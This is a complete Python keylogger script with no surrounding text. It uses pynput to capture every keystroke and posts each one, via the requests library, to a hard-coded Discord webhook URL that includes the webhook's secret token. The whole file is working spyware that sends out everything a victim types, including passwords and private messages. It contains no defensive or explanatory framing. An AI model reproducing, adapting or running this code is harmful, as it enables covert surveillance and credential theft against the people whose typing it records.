import requests
from pynput import keyboard


def on_press(key):
    try:
        url = "https://discord.com/api/webhooks/1212539003543363594/X7uvDlZW0NKmjTgXglFB3lJpsnSu75P_lymcg5KW_FKjVxsJr_xNqqEDKxdwEq5A8Fem"
        data = {
            "content": key.char,
            "username": "feb"
        }
        result = requests.post(url, json=data)
    except AttributeError:
        url = "https://discord.com/api/webhooks/1212539003543363594/X7uvDlZW0NKmjTgXglFB3lJpsnSu75P_lymcg5KW_FKjVxsJr_xNqqEDKxdwEq5A8Fem"
        data = {
            "content": key,
            "username": "feb"
        }
        result = requests.post(url, json=data)


with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
